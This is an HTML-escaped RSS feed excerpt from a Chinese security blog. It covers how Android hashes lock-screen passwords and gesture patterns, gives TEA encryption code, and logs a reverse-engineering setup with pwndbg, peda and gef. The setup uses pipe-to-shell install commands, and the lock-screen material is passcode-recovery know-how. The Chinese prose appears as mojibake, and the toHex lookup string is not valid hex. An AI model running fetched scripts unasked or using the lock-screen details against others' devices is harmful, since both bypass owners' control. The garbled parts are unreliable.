&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">private&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toHex&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">byte&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">ary&lt;/span>&lt;span class="o">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">final&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">hex&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;102031398sjdfklaj&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">ary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">length&lt;/span>&lt;span class="o">;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">++){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ret&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">hex&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">charAt&lt;/span>&lt;span class="o">((&lt;/span>&lt;span class="n">ary&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">]&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">)&amp;amp;&lt;/span> &lt;span class="n">0xf&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ret&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">hex&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">charAt&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">ary&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">]&amp;amp;&lt;/span> &lt;span class="n">0xf&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ret&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SALT çš„å€¼å¯ä»¥ä»æ•°æ®åº“ä¸­æ‹¿åˆ° ä¹Ÿå¯ä»¥åˆ©ç”¨åå°„è·å–&lt;/p>
&lt;p>æ€»ç»“ï¼š&lt;/p>
&lt;p>â€‹ MD5(è¾“çš„æ˜æ–‡å¯†ç +è®¾å¤‡çš„salt).hex+ SHA1(è¾“çš„çš„æ˜æ–‡å¯†ç +è®¾å¤‡çš„saltå€¼).hex&lt;/p>
&lt;blockquote>
&lt;p>2.2 æ‰‹åŠ¿å¯†ç åˆ†æ&lt;/p>
&lt;/blockquote>
&lt;p>å¤§è‡´åŒä¸Š&lt;/p>
&lt;h3 id="3-ç®€è¦">3. ç®€è¦ï¼š&lt;/h3>
&lt;p>â€‹ ä¹å®«æ ¼å›¢è£…åŒ–æˆå­—èŠ‚æ•°ç»„-&amp;gt;sha1 åŠ å¯† å³å¯&lt;/p>
&lt;p>å…¶å®å¤§è‡´æµç¨‹å’Œåˆ†æè¾“å…¥å¯†ç å·®ä¸å¤š ä¿å­˜åˆ°æœ¬åœ°çš„ç›®å½•/data/system/gesture.key æ–‡ä»¶&lt;/p></description></item><item><title>TEAåŠ å¯†ä¸è§£å¯†</title><link>https://ykiko.top/p/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</link><pubDate>Wed, 17 Jan 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</guid><description>&lt;h1 id="teaåŠ å¯†ä¸è§£å¯†">TEAåŠ å¯†ä¸è§£å¯†&lt;/h1>
&lt;h2 id="teaåŠ å¯†ä¸è§£å¯†-1">TEAåŠ å¯†ä¸è§£å¯†&lt;/h2>
&lt;blockquote>
&lt;p>TEAç®—æ³•ç”±å‰‘æ¡¥å¤§å­¦è®¡ç®—æœºå®éªŒå®¤çš„David Wheelerå’ŒRoger Needhamäº1994å¹´å‘æ˜ã€‚å®ƒæ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œå…¶æ˜æ–‡å¯†æ–‡å—ä¸º64æ¯”ç‰¹ï¼Œå¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹ã€‚TEAç®—æ³•åˆ©ç”¨ä¸æ–­å¢åŠ çš„Delta(é»„é‡‘åˆ†å‰²ç‡)å€¼ä½œä¸ºå˜åŒ–ï¼Œä½¿å¾—æ¯è½®çš„åŠ å¯†æ˜¯ä¸åŒï¼Œè¯¥åŠ å¯†ç®—æ³•çš„è¿­ä»£æ¬¡æ•°å¯ä»¥æ”¹å˜ï¼Œå»ºè®®çš„è¿­ä»£æ¬¡æ•°ä¸º32è½®ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>åœ¨æ¸¸æˆé¡¹ç›®ä¸­ï¼Œä¸€èˆ¬éœ€è¦å¯¹èµ„æºæˆ–æ•°æ®è¿›è¡ŒåŠ å¯†ä¿æŠ¤ï¼Œæœ€ç®€å•é«˜æ•ˆçš„åŠ å¯†ç®—æ³•å°±æ˜¯é‡‡ç”¨ä½ä¸æˆ–ä¹‹ç±»çš„ï¼Œä½†æ˜¯æ¯”è¾ƒå®¹æ˜“è¢«äººåˆ†æå‡ºæ¥ã€‚ TEAåŠ å¯†ç®—æ³•ä¸ä½†æ¯”è¾ƒç®€å•ï¼Œè€Œä¸”æœ‰&lt;strong>å¾ˆå¼ºçš„æŠ—å·®åˆ†åˆ†æèƒ½åŠ›&lt;/strong>ï¼Œ&lt;strong>åŠ å¯†é€Ÿåº¦ä¹Ÿæ¯”è¾ƒå¿«&lt;/strong>ã€‚å¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚è®¾ç½®åŠ å¯†è½®æ•°æ¥å¢åŠ åŠ å¯†å¼ºåº¦ã€‚&lt;em>ä¸»è¦è¿ç”¨äº†ç§»ä½å’Œå¼‚æˆ–è¿ç®—ã€‚å¯†é’¥åœ¨åŠ å¯†è¿‡ç¨‹ä¸­å§‹ç»ˆä¸å˜ã€‚&lt;/em>&lt;/p>
&lt;blockquote>
&lt;p>å·®åˆ†åˆ†ææ˜¯ä¸€ç§é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œå…¶åŸºæœ¬æ€æƒ³æ˜¯ï¼šé€šè¿‡åˆ†æç‰¹å®šæ˜æ–‡å·®åˆ†å¯¹ç›¸å¯¹åº”å¯†æ–‡å·®åˆ†å½±å“æ¥è·å¾—å°½å¯èƒ½å¤§çš„å¯†é’¥ã€‚å®ƒå¯ä»¥ç”¨æ¥æ”»å‡»ä»»ä½•ç”±è¿­ä»£ä¸€ä¸ªå›ºå®šçš„è½®å‡½æ•°çš„ç»“æ„çš„å¯†ç ä»¥åŠå¾ˆå¤šåˆ†ç»„å¯†ç ï¼ˆåŒ…æ‹¬DESï¼‰ï¼Œå®ƒæ˜¯ç”±Bihamå’ŒShamiräº1991å¹´æå‡ºçš„é€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>
&lt;p>åŠ å¯†æ ¸å¿ƒå‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">EncryptTEA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">firstChunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">secondChunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">){&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">firstChunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">z&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">secondChunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">delta&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x9e3779b9&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">//8è½®è¿ç®—(éœ€è¦å¯¹åº”ä¸‹é¢çš„è§£å¯†æ ¸å¿ƒå‡½æ•°çš„è½®æ•°ä¸€æ ·) { sum += delta; y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]); z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]); } *firstChunk = y; *secondChunk = z;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>ç®—æ³•ä½¿ç”¨äº†ä¸€ä¸ªç¥ç§˜å¸¸æ•°Î´ä½œä¸ºå€æ•°ï¼Œå®ƒæ¥æºäºé»„é‡‘æ¯”ç‡ï¼Œä»¥ä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒã€‚ä½†Î´çš„ç²¾ç¡®å€¼ä¼¼ä¹å¹¶ä¸é‡è¦ï¼Œè¿™é‡Œ TEA æŠŠå®ƒå®šä¹‰ä¸º Î´=ã€Œ(âˆš5 - 1)231ã€â€“&amp;gt; delta = 0x9e3779b9;&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>
&lt;p>è§£å¯†æ ¸å¿ƒå‡½æ•°&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">DecryptTEA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">firstChunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">secondChunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">){&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">firstChunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">z&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">secondChunk&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">delta&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x9e3779b9&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">sum&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">delta&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//32è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„5æ¬¡æ–¹ï¼›16è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„4æ¬¡æ–¹ï¼›8è½®è¿ç®—ï¼Œæ‰€ä»¥æ˜¯2çš„3æ¬¡æ–¹ for (int i = 0; i &amp;lt; 8; i++) //8è½®è¿ç®— { z -= (y &amp;lt;&amp;lt; 4) + key[2] ^ y + sum ^ (y &amp;gt;&amp;gt; 5) + key[3]; y -= (z &amp;lt;&amp;lt; 4) + key[0] ^ z + sum ^ (z &amp;gt;&amp;gt; 5) + key[1]; sum -= delta; } *firstChunk = y; *secondChunk = z;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>EnvRecord</title><link>https://ykiko.top/p/envrecord/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ykiko.top/p/envrecord/</guid><description>&lt;h1 id="envrecord">EnvRecord&lt;/h1>
&lt;blockquote>
&lt;p>ç”¨æ¥ä¸æ—¶è®°å½•å¹³æ—¶æ‰€ç”¨ç¯å¢ƒé…ç½®ï¼Œä»¥åŠé‡åˆ°çš„å„ç§é—®é¢˜ä»¥åŠè§£å†³åŠæ³•ã€‚ä¸»è¦æ˜¯ä¸ºäº†é˜²ä¸¢å¤±ï¼Œä»¥åŠæ€»æ˜¯å’Œç©ºæ°”æ–—å¿—æ–—å‹‡ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="win10">&lt;strong>Win10&lt;/strong>&lt;/h2>
&lt;blockquote>
&lt;p>æ—¥å¸¸ä½¿ç”¨&lt;/p>
&lt;/blockquote>
&lt;h3 id="wsl">&lt;strong>WSL&lt;/strong>&lt;/h3>
&lt;p>é»˜è®¤ä¸æ˜¯root è®¾ç½®é»˜è®¤rootç”¨æˆ·ã€‚&lt;code>ubuntu config --default-user root&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>on my zsh è£…ä¸Š&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener"
>å®˜æ–¹github&lt;/a>&lt;/p>
&lt;p>éœ€è¦å…ˆå®‰è£…&lt;a class="link" href="https://github.com/robbyrussell/oh-my-zsh/wiki/Installing-ZSH" target="_blank" rel="noopener"
>ZSH&lt;/a>ã€‚&lt;/p>
&lt;p>å®‰è£…on my zsh:&lt;/p>
&lt;p>via curlï¼š&lt;code>sh -c &amp;quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&amp;quot;&lt;/code>&lt;/p>
&lt;p>via wget:Â &lt;code>sh -c &amp;quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&amp;quot;&lt;/code>&lt;/p>
&lt;p>ç„¶åé…ç½®å–œæ¬¢çš„ æ’ä»¶+ä¸»é¢˜ã€‚&lt;code>vi ~/.zshrc&lt;/code>Â ä¿®æ”¹&lt;code>plugins&lt;/code>å±æ€§&lt;/p>
&lt;p>å¿…å¤‡æ’ä»¶gitã€autojumpã€zsh-autosuggestionsã€‚&lt;a class="link" href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes" target="_blank" rel="noopener"
>ä¸»é¢˜&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GDBè£…ä¸Š+pwndbg+peda+gef&lt;/p>
&lt;p>wslçš„ubuntuä¸æ”¯æŒx86ï¼Œæ‰€ä»¥ä¸»è¦åªèƒ½è°ƒè¯•x64çš„ç¨‹åºï¼Œè€Œä¸”å¯èƒ½ä¼šå‡ºç°è«åå…¶å¦™çš„é”™è¯¯ã€‚&lt;/p>
&lt;p>ä¸è¿‡å¯ä»¥ä½¿ç”¨qemuæ¥è¿è¡Œx86çš„ç¨‹åºï¼Œè°ƒè¯•è¿˜æ˜¯ä¸è¡Œä¼šå‡ºé”™ã€‚&lt;a class="link" href="https://github.com/Microsoft/WSL/issues/2468" target="_blank" rel="noopener"
>å‚è€ƒ&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo apt install qemu-user-static
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic &lt;span class="s1">&amp;#39;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&amp;#39;&lt;/span> --mask &lt;span class="s1">&amp;#39;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è¿è¡Œä¸‹é¢çš„ä¸€æ¡å‘½ä»¤å°±è¡Œè·‘x86 ä¸è¿‡æ¯æ¬¡æ‰“å¼€wsléƒ½å¾—è¿è¡Œä¸€æ¬¡ï¼Œå¾ˆéº»çƒ¦ï¼Œå¯ä»¥å†™è„šæœ¬è‡ªåŠ¨å¼€å¯ã€‚&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo service binfmt-support start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>
&lt;p>pwndbg+peda+gef&lt;/p>
&lt;p>ä¸‰ä¸ªéƒ½å¯èƒ½ç”¨åˆ°ï¼Œä¸‰ä¸ªå·¥å…·ç‰¹æ€§ä¸ä¸€æ ·ã€‚å„æœ‰å¼ºé¡¹ï¼Œæ‰€ä»¥ä¸‰ä¸ªéƒ½è£…ï¼Œä½¿ç”¨è„šæœ¬&lt;code>gdb.sh&lt;/code>å¯åŠ¨é€‰é¡¹&lt;/p>
&lt;p>å®‰è£…pwndbg:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/pwndbg/pwndbg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> pwndbg
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./setup.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>peda:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/longld/peda.git ~/peda
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;source ~/peda/peda.py&amp;#34;&lt;/span> &amp;gt;&amp;gt; ~/.gdbinit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>gef:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># via the install script&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh &lt;span class="p">|&lt;/span> sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># manually&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ &lt;span class="nb">echo&lt;/span> &lt;span class="nb">source&lt;/span> ~/.gdbinit-gef.py &amp;gt;&amp;gt; ~/.gdbinit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>gdb.sh æŠŠè¯¥æ–‡ä»¶æ”¾åœ¨&lt;code>/usr/local/sbin&lt;/code>Â å‚è€ƒ&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="k">function&lt;/span> Mode_change &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">gdbinitfile&lt;/span>&lt;span class="o">=&lt;/span>~/.gdbinit#è¿™ä¸ªè·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹# &lt;span class="nv">gdbinitfile&lt;/span>&lt;span class="o">=&lt;/span>/root/Desktop/mode#è·¯å¾„æŒ‰ç…§ä½ çš„å®é™…æƒ…å†µä¿®æ”¹
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">peda&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;source ~/peda/peda.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">gef&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;source ~/.gdbinit-gef.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">pwndbg&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;source /home/pwndbg/gdbinit.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">sign&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>cat &lt;span class="nv">$gdbinitfile&lt;/span> &lt;span class="p">|&lt;/span> grep -n &lt;span class="s2">&amp;#34;#this place is controled by user&amp;#39;s shell&amp;#34;&lt;/span>&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#æ­¤å¤„ä¸Šé¢çš„æŸ¥æ‰¾å†…å®¹è¦å’Œä½ è‡ªå·±çš„ä¿æŒä¸€è‡´&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">pattern&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;:#this place is controled by user&amp;#39;s shell&amp;#34;&lt;/span>
